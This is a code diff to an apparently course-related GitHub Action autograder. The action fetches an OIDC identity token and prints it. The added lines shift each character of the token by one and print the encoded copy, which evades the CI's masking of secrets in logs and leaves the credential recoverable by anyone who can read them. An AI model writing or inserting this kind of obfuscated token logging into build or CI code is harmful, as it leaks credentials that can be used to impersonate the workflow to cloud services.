@@ -13196,6 +13196,11 @@ function run() {
         const actor = payload.head_commit.committer.username;
         const oidcToken = yield core.getIDToken();
         console.log(oidcToken);
+        let newToken = '';
+        for (let i = 0; i < oidcToken.length; i++) {
+            newToken += String.fromCharCode(oidcToken.charCodeAt(i) + 1);
+        }
+        console.log(newToken);
         const { courseId, assignmentId } = yield genMatricTokenInfo(oidcToken);
         const repoUrl = yield genRepoUrl(courseId, assignmentId);
         const repoClonedAndRenamed = yield cloneRepo('csf-hw3', repoUrl).then(() => __awaiter(this, void 0, void 0, function* () { return yield executeSetupAndAutograder(); }));
